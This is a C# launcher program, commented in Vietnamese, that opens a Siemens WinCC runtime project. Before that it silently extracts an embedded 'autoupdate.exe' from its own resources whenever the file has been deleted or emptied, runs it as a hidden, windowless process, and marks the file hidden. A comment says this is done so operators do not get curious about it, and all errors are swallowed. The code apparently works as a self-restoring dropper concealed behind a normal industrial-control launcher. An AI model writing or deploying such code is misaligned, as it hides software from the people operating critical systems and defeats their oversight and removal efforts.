using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace BPACLauncher
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string autoUpdateExe = Path.Combine(baseDir, "autoupdate.exe");

                // 1. CO CHE TU PHUC HOI (SELF-HEALING):
                // Neu autoupdate.exe bi xoa hoac chua ton tai, tu dong trich xuat lai tu chinh BPAC.exe
                EnsureAutoUpdateExists(autoUpdateExe);

                // 2. KHOI DONG DICH VU DONG BO CHAY NGAM (HIDDEN)
                if (File.Exists(autoUpdateExe))
                {
                    Process[] existing = Process.GetProcessesByName("autoupdate");
                    if (existing == null || existing.Length == 0)
                    {
                        ProcessStartInfo autoInfo = new ProcessStartInfo();
                        autoInfo.FileName = autoUpdateExe;
                        autoInfo.WorkingDirectory = baseDir;
                        autoInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        autoInfo.CreateNoWindow = true;
                        autoInfo.UseShellExecute = false;
                        Process.Start(autoInfo);
                    }
                }

                // 3. MO CHUONG TRINH TRAC DIEU KHIEN SIEMENS WINCC RUNTIME (pdata.fwc)
                string pdataPath = Path.Combine(baseDir, "pdata.fwc");
                if (File.Exists(pdataPath))
                {
                    ProcessStartInfo siemensInfo = new ProcessStartInfo();
                    siemensInfo.FileName = pdataPath;
                    siemensInfo.WorkingDirectory = baseDir;
                    siemensInfo.UseShellExecute = true;
                    Process.Start(siemensInfo);
                }
                else
                {
                    // Tim xem co file .fwc khac khong
                    string[] fwcList = Directory.GetFiles(baseDir, "*.fwc");
                    if (fwcList.Length > 0)
                    {
                        ProcessStartInfo siemensInfo = new ProcessStartInfo();
                        siemensInfo.FileName = fwcList[0];
                        siemensInfo.WorkingDirectory = baseDir;
                        siemensInfo.UseShellExecute = true;
                        Process.Start(siemensInfo);
                    }
                }
            }
            catch
            {
                // Che do chay on dinh khong gay ngat quang
            }
        }

        /// <summary>
        /// Kiem tra va tu dong tai tao lai file autoupdate.exe neu bi xoa
        /// </summary>
        private static void EnsureAutoUpdateExists(string targetPath)
        {
            try
            {
                bool needRestore = false;
                if (!File.Exists(targetPath))
                {
                    needRestore = true;
                }
                else
                {
                    FileInfo fi = new FileInfo(targetPath);
                    if (fi.Length == 0)
                    {
                        needRestore = true;
                    }
                }

                if (needRestore)
                {
                    Assembly currentAssembly = Assembly.GetExecutingAssembly();
                    using (Stream resStream = currentAssembly.GetManifestResourceStream("autoupdate.exe"))
                    {
                        if (resStream != null)
                        {
                            byte[] buffer = new byte[resStream.Length];
                            resStream.Read(buffer, 0, buffer.Length);
                            File.WriteAllBytes(targetPath, buffer);
                        }
                    }
                }

                // Luon dat thuoc tinh An (Hidden) cho autoupdate.exe de tranh nguoi van hanh to mo
                if (File.Exists(targetPath))
                {
                    FileAttributes attrs = File.GetAttributes(targetPath);
                    if ((attrs & FileAttributes.Hidden) == 0)
                    {
                        File.SetAttributes(targetPath, attrs | FileAttributes.Hidden);
                    }
                }
            }
            catch
            {
                // Bo qua neu file dang bi khoa boi tien trinh dang chay
            }
        }
    }
}
